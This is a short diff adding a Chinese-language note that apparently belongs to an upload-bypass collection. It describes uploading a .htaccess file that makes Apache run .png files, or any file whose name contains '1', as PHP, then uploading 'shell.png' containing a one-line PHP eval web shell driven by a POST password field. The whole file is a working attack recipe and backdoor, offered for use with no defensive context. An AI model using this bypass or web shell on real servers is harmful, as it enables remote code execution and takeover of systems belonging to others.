@@ -1,0 +1,26 @@
+
+***************************************************************************************
+*解析：
+*	添加规制，将指定后缀名的文件当作php文件执行
+*用法：
+*	先上传 .htaccess
+		AddType application/x-httpd-php .png 
+	再上传 shell.png
+		<?php @eval($_POST['passwd']);?>
+***************************************************************************************
+
+// .htaccess
+AddType application/x-httpd-php .png 
+
+
+
+
+// php_flag magic_quotes_gpc Off 
+
+
+
+
+//可以在.htaccess 加入php解析规则,类似于把文件名包含1的解析成php
+<FilesMatch "1">
+	SetHandler application/x-httpd-php
+</FilesMatch>
